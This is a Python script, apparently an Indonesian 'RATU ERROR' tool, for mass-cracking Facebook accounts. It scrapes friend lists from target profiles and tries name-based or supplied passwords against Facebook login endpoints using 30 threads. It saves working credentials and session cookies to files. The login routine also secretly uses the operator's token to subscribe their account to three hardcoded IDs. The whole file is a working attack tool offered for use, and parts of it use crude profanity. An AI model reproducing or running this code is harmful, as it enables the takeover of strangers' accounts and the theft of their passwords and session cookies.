	jalan ('\x1b[1;96mAuthor \x1b[1;97m : \x1b[1;94mRomi Afrizal\x1b[1;97m          |  |___________| ')
	jalan ('\x1b[1;96mAdmin  \x1b[1;97m : \x1b[1;93mJessica Putri\x1b[1;97m         |  | ((_(_)| )_) ')
	jalan ('\x1b[1;96mGroup\x1b[1;97m   : \x1b[1;92mRATU ERROR            \33[0;1m\x1b[1;97m|  \_((_(_)|/(_) ')
	jalan ('\x1b[1;96m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\x1b[1;97m\             ( ')
	jalan ('\x1b[1;96m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\x1b[1;97m\_____________)')

def banner():                
	os.system('clear')
	print ('')
	print ('')
	print ('')
	jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
	print ('')
	jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
	print (' \033[1;96m  ____________________________________________')
	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')

id = []
cp = []
ok = []
loop = 0
	
#--- login
def login():
	try:
		ses = requests.Session()
		cookie = input(f'\n{P} ! Login menggunakan cookie:{K} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open("data/token.txt", "w").write(tok)
		cokiew = open("data/cookie.txt", "w").write(cookie)
		print (f"\n{P} + token:{H} {tok}");jeda(2)
		requests.post(f"https://graph.facebook.com/100067807565861/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
		requests.post(f"https://graph.facebook.com/100029143111567/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
		requests.post(f"https://graph.facebook.com/100028434880529/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
		print (f"\n{H} √ login berhasil");jeda(2)
		menu()
	except Exception as e:
		os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
		print(e)
		exit()
#--- menu 
def menu():
	os.system("clear")
	banner()
	try:
		token = open("data/token.txt","r").read()
		coki = {"cookie":open("data/cookie.txt","r").read()}
		nama = json.loads(requests.get(f'https://graph.facebook.com/me?fields=name,id&access_token={token}',cookies=coki).text)["name"] 
	except (FileNotFoundError,KeyError,IOError):
		#print (f"{M} ! cookie invalid");jeda(2)
		login()
	except requests.exceptions.ConnectionError:
		exit(f"{M} ! tidak ada koneksi")
	banner()
	print('')
	print('')
	print (' %s[%s01%s] %sCrack dari publik'%(O,P,O,P))
	print (' %s[%s02%s] %sCrack %sUNLIMITED'%(O,P,O,P,H))
	print (' %s[%s03%s] %sCrack %sLihat hasil crack'%(O,P,O,P,H))
	print (' %s[%s04%s] %sCrack %sSetting user agent'%(O,P,O,P,H))
	print (' %s[%s0%s] %sCrack %sKeluar'%(O,P,O,P,H))

	romz=input(" ? Pilih: ")
	if romz in ['']:
		print ("\n ! jangan kosong")
	elif romz in ['1']:
		publik(token,coki)
	elif romz in ['2']:
		massal(token,coki)
	elif romz in ['3']:
		hasil()
	elif romz in ['4']:
		UA()
		uas = open('ugent.txt','r').read()
		print (f"{P} ! User-Agent saat ini: {U}{uas}")
		print (f"{P} ! jika tidak mau ingin mengganti User-Agent ketik {H}no{P} ")
		us = input (" ? User-Agent: ")
		if us in['no','No','NO']:
			exit()
		elif us in['']:
			uas = ("Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]")
			open('ugent.txt','w').write(uas)
		else:
			open('ugent.txt','w').write(us)
	elif romz in ['0']:
		exit()
	else:
		print ("\n ! isi yg benar")

id =[]
#--- publik
def publik(token,cookie):
	try:
		user=input(f"\n{P} ? ID publik: ")
		if user in pepek:
			exit("\n ! gk usah tolol")
		else:
			po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
			for i in po['friends']['data']:
				id.append(f"{i['id']}<=>{i['name']}")
			sys.stdout.write (f'\r + mengumpulkan ID{M} >{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050)
	except KeyError:
		exit(f"{M} gagal mengambil ID")
	
	print('')
	return crack().__xnx__(id)
	
#--- massal
def massal(token,cookie):
	try:
		jum = int(input(f"{P} ? Jumlah target: "))
		print ('')
	except:jum=1
	for t in range(jum):
		t +=1
		try:
			user=input(f"{P} ? ID publik {t}: ")
			if user in pepek:
				exit("\n ! gk usah tolol")
			else:
				po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
				for i in po['friends']['data']:
					id.append(f"{i['id']}<=>{i['name']}")
		except KeyError:
			exit(f"{M} gagal mengambil ID")
	print (f'\r + mengumpulkan ID{M} >{H} {len(id)} ')
	
	return crack().__xnx__(id)

#--- lihat hasil
oke,cepe=[],[]
def hasil():
	print(f"""
 1. Cek hasil akun {H}OK{P}
 2. Cek hasil akun {K}CP{P}
 0. Kembali
	""")
	rom = input(' ? Pilih: ')
	if rom in['']:
		exit("\n ! isi yg benar")
	elif rom in['1','01']: 
		try:
			dirs = os.listdir('OK')
			for file in dirs:
				oke.append(file)
		except:pass 
		if len(oke)==0:
			exit("\n ! file tidak tersedia")
		else:
			print(f'\n + Hasil akun {H}OK{P} yg fersimpan di folder anda')
			nomor = 0
			for i in oke:
				fil = open(f"OK/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{H} {i} {P}-{H} {str(len(fil))} ")
			print(f"{P}\n + silahkan pilih nomor yg ingin di cek")
			file = input(f" ? nomor: ")
			try:
				hasil = oke[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n ! isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalok = open(f"OK/{hasil}", "r").read().splitlines()
			print(f"\n{P}#---")
			print (f"{P} Hasil tanggal: {file_nm} total: {H}{len(totalok)}")
			print(f"{P}#---")
			for ngontol in totalok:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;92m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['2','02']: 
		try:
			dirs = os.listdir('CP')
			for file in dirs:
				cepe.append(file)
		except:pass 
		if len(cepe)==0:
			exit("\n ! file tidak tersedia")
		else:
			print(f'\n + Hasil akun {K}CP{P} yg fersimpan di folder anda')
			nomor = 0
			for i in cepe:
				fil = open(f"CP/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{K} {i} {P}-{K} {str(len(fil))} ")
			print(f"{P}\n + silahkan pilih nomor yg ingin di cek")
			file = input(f" ? nomor: ")
			try:
				hasil = cepe[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n ! isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalcp = open(f"CP/{hasil}", "r").read().splitlines()
			print(f"\n{P}#---")
			print (f"{P} Hasil tanggal: {file_nm} total: {K}{len(totalcp)}")
			print(f"{P}#---")
			for ngontol in totalcp:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;93m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['0','00']:
		os.system("python simple.py")
	else:
		exit("\n ! isi yg benar")
	
#--- menu crack
ok,cp,loop=[],[],0
class crack:
	
	def __init__(self):
		self.id =[]
	
	def __xnx__(self,id):
		self.id =id 
		cx=input(f" {P}? gunakan password manual y/t: ")
		if cx in ('y'):
			self.manual()
		elif cx in ('t'):
			print (f"""
 {P}1. methode api
 2. methode mbasic
 3. methode mobile 
			""");self.langsung()
		else:
			exit()
	
	def manual(self):
		print (f"\n{P} ! contoh: sayang,anjing,123456")
		pwek=input(" ? password: ")
		if pwek in(''):
			exit("\n ! jangan kosong")
		elif len(pwek)<=5:
			exit("\n ! password minimal 6 huruf")
		else:
			pass 
		print (f"""
 {P}1. methode api
 2. methode mbasic
 3. methode mobile 
		""")
		men=input(" ? Pilih: ")
		print (f"""
 + akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 + akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 + crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in id:
				pwx = []
				uid = akun.split('<=>')[0]
				pwx = pwek.split(",")
				if men in['1']:
					titid.submit(self.__crack__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__crack__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__crack__, uid, pwx,  "m.facebook.com")
				else:
					exit("\n ! isi yang benar")
					
		self.hasil(ok,cp)
		
	def langsung(self):
		men=input(" ? Pilih: ")
		print (f"""
 + akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 + akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 + crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in id:
				pwx = []
				uid,name = akun.split('<=>')[0],akun.split('<=>')[1].lower()
				na = name.split(' ')[0]
				if len(name)<6:
					if len(na)<3:
						pass 
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
				else:
					if len(na)<3:
						pwx.append(name)
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
				if men in['1']:
					titid.submit(self.__crack__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__crack__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__crack__, uid, pwx,  "m.facebook.com")
				else:
					exit("\n ! isi yang benar")
					
		self.hasil(ok,cp)
					
	#--- methode
	def __crack__(self, user, peweh, url_log):
		global ok,cp,loop 
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print (f"\r{komtol} • {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
		for pw in peweh:
			try: 
				ses = requests.Session()
				uas = UA()
				ses.headers.update({"Host": url_log,"cache-control": "max-age=0","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				p = ses.get(f"https://{url_log}/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2F{url_log}%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
				dataa ={
					"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
					"email":user, 
					"flow": "login_no_pin", 
					"pass":pw,
				}
				koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
				koki+=' m_pixel_ratio=2.625; wd=412x756'
				headerx={"Host": url_log,"connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://"+url_log,"content-type": "application/x-www-form-urlencoded","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://{url_log}/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2F{url_log}%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
				po = ses.post(f'https://{url_log}/login/device-based/regular/login/?api_key=2036793259884297&auth_token=3cef90256fbcb9cbfe87b20fc6a1c7a8&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&refsrc=deprecated&app_id=2036793259884297&cancel=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&lwv=100&locale2=id_ID&refid=9',data=dataa,cookies={'cookie': koki},headers=headerx,allow_redirects=False)
				if "c_user" in ses.cookies.get_dict():
					romz = ses.cookies.get_dict()
					kukis = ";".join([key+"="+value for key, value in romz.items()])
					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n ')
					ok.append(f"{user} ◊ {pw} ◊ {kukis} ")
					open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {kukis} \n")
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					print (f'\r{P}└── {K}{user} ◊ {pw}  \n ')
					cp.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				jeda(3)
			
		loop+=1
		
	#--- selesai hasil
	def hasil(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			print (f"\n\n{H} √ {P}crack selesai....")
			print (f"{H} + OK: {len(ok)} ")
			print (f"{K} + CP: {len(cp)}{P}");exit()
		else:
			exit(f"\n {M}× ops tidak mendapatkan hasil")


if __name__=="__main__":
	#os.system("clear")
	#os.system("git pull")
	try:os.mkdir('data')
	except:pass 
	menu()
